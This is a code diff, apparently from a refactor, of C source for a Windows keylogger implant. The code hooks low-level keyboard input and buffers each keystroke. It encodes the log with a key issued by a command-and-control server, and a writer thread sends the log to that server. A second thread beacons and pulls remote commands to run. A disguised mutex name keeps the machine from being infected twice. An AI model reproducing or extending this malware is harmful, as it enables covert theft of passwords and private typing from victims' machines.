@@ -9,15 +9,14 @@
 // prototypes for private functions
 static PROGRAM_CONTEXT* initProgramContext();
 static ERR_CODE runKeyLogger();
-static void setEncKey();
 static void doShutdown();
 
 DWORD WINAPI writeLogThread(LPVOID lpParam);
-DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam);
+DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam);
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 
-PROGRAM_CONTEXT* progContext;
+PROGRAM_CONTEXT* ctx;
 
 
 /**
@@ -29,17 +28,18 @@ PROGRAM_CONTEXT* progContext;
  * already infected! (4) 
  */
 ERR_CODE setup() {
-    progContext = initProgramContext(); // 1
-    if (progContext == NULL) { return ECODE_NULL; }
+    ctx = initProgramContext(); // 1
+    if (ctx == NULL) { return ECODE_NULL; }
 
-    ERR_CODE ret = registerClient(progContext->client); // 2
+    ERR_CODE ret = registerClient(ctx->client, &ctx->__KEY__); // 2
     if (ret != ECODE_SUCCESS) { return ret; }
     
-    setEncKey();  // sets keyloogger encoding key
+    // set the key loggers encoding key
+    ctx->kLogger->encKey = ctx->__KEY__;
 
     // 3 create threading mutex with a somewhat believeable name :)
-    progContext->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (progContext->hMutexThreadSync == NULL)  { return ECODE_NULL; } 
+    ctx->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
+    if (ctx->hMutexThreadSync == NULL)  { return ECODE_NULL; } 
     if (GetLastError() == ERROR_ALREADY_EXISTS) { return ECODE_SAFE_RET; } // 4 
 
     printf("\nPROGRAM_CONTEXT initialised...\n\n");
@@ -74,6 +74,7 @@ static PROGRAM_CONTEXT* initProgramContext() {
         programContextCleanup(prCon);
         return NULL;
     }
+
     prCon->mainThreadId = GetCurrentThreadId();
     prCon->hCmdThread = NULL;
     prCon->hWriteThread = NULL;
@@ -91,19 +92,19 @@ static PROGRAM_CONTEXT* initProgramContext() {
 ERR_CODE startThreads() {
     // create the worker threads
     HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);
-    HANDLE hCmdThr = CreateThread(NULL, 0, commandsAndBeaconThread, NULL, 0, NULL);
+    HANDLE hCmdThr = CreateThread(NULL, 0, pollCmdsAndBeaconThread, NULL, 0, NULL);
 
     // update the program context
-    progContext->hWriteThread = hWriteThr;
-    progContext->hCmdThread = hCmdThr;
-    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) {
+    ctx->hWriteThread = hWriteThr;
+    ctx->hCmdThread = hCmdThr;
+    if (ctx->hCmdThread == NULL || ctx->hWriteThread == NULL) {
         return ECODE_NULL;
     }
     
     ERR_CODE ret = runKeyLogger();
 
     // wait for both threads to finish
-    HANDLE threads[2] = { progContext->hWriteThread, progContext->hCmdThread };
+    HANDLE threads[2] = { ctx->hWriteThread, ctx->hCmdThread };
     WaitForMultipleObjects(2, threads, TRUE, INFINITE);
 
     printf("Threads complete!\n");
@@ -120,34 +121,26 @@ ERR_CODE startThreads() {
  * do anything to limit network activity.
  */
 DWORD WINAPI writeLogThread(LPVOID lpParam) {
-    while (!progContext->shutdown) {
+    while (!ctx->shutdown) {
         Sleep(SLP_WRITER_THREAD);
-
-        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
         
-        KEY_LOGGER* kLogger = progContext->kLogger;
-        if (kLogger->bufferPtr == 0) { 
-            // skip the write if the buffer is empty
-            goto skipWrite; 
+        // skip the write if the buffer is empty
+        if (ctx->kLogger->bufferPtr == 0) {            
+            goto skipWrite;
         }
-
-        CLIENT_HANDLER* client = progContext->client;
-        char* buffer = kLogger->keyBuffer;
-        unsigned int writeSize = kLogger->bufferPtr;
 
         // tries the to write the key buffer at max 3 times
         int ret = ECODE_POST;
         for (int i = 1; i < 3 && ret == ECODE_POST; i++) {
-            ret = writeKeyLog(client, buffer, writeSize);
+            ret = writeKeyLog(ctx->client, ctx->kLogger);
         }
         if (ret != ECODE_SUCCESS) { printErr(ret); }
 
-        kLogger->bufferPtr = 0;
-        kLogger->keyBuffer[0] = '\0';
-        setEncKey(); // make sure to reset the encoding key
+        resetKLBufferAndKey(ctx->kLogger, ctx->__KEY__);
 
-        skipWrite: 
-        ReleaseMutex(progContext->hMutexThreadSync);
+        skipWrite:
+        ReleaseMutex(ctx->hMutexThreadSync);
     }
     return 0;
 }
@@ -156,12 +149,12 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
  * function that executes infinitely until `shd` command is given. 
  * Each iteration it retrieves the remote commands and then executes them!
  */
-DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
-    while (!progContext->shutdown) {
+DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
+    while (!ctx->shutdown) {
         Sleep(SLP_CMD_THREAD);
 
-        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
-        CLIENT_HANDLER* client = progContext->client;
+        WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
+        CLIENT_HANDLER* client = ctx->client;
 
         // get the commands from the server
         ERR_CODE ret = pollCommandsAndBeacon(client);
@@ -173,7 +166,7 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
             if (ret == ECODE_DO_SHUTDOWN) { doShutdown(); }
             if (ret != ECODE_SUCCESS)     { printErr(ret); }
         }
-        ReleaseMutex(progContext->hMutexThreadSync);
+        ReleaseMutex(ctx->hMutexThreadSync);
     }
     return 0;
 }
@@ -190,7 +183,7 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
  */
 static ERR_CODE runKeyLogger() {
     MSG msg;
-    while (!progContext->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
+    while (!ctx->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessageA(&msg);
     }
@@ -202,39 +195,32 @@ static ERR_CODE runKeyLogger() {
  * function. Creating this function was also based on the previous functions resource
  */
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (progContext->sleeping) {  // skip if the program is "sleeping"
-        return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+    if (ctx->sleeping) {  // skip if the program is "sleeping"
+        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
     }
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
 
     // skip key presses that update ke logger state, and key up events
-    BOOL wasUpdated = updateKeyLoggerState(progContext->kLogger, wParam, &vkCode);
+    BOOL wasUpdated = updateKeyLoggerState(ctx->kLogger, wParam, &vkCode);
     if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-        return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+        return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
     }
     
-    ERR_CODE ret = addKeyPressToBuffer(progContext->kLogger, &vkCode);
+    ERR_CODE ret = addKeyPressToBuffer(ctx->kLogger, &vkCode);
     if (ret == ECODE_FULL_BUFF) {
         // do something?
     }
-    printf("%s\n", progContext->kLogger->keyBuffer);
-    return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+    printf("%s\n", ctx->kLogger->keyBuffer);
+    return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
 }
 
-/**
- * The client secret key is given to them after registering and is simply
- * 4 random bytes generated by the C2. We can then use the first byte as the 
- * key loggers encoding key, as the C2 knows this key as well!
- */
-static void setEncKey() {
-    progContext->kLogger->encKey = progContext->client->ENC_KEY;
-}
+
 
 static void doShutdown() {
-    progContext->shutdown = TRUE;  // set the shutdown flag
+    ctx->shutdown = TRUE;  // set the shutdown flag
     // post a message to the main thread, this will cause it to stop!
-    PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
+    PostThreadMessageA(ctx->mainThreadId, WM_QUIT, 0, 0);
 }
 
 
@@ -244,7 +230,7 @@ static void doShutdown() {
 // ---------------
 
 void programCleanup() {
-    programContextCleanup(progContext);
+    programContextCleanup(ctx);
 }
 
 /**
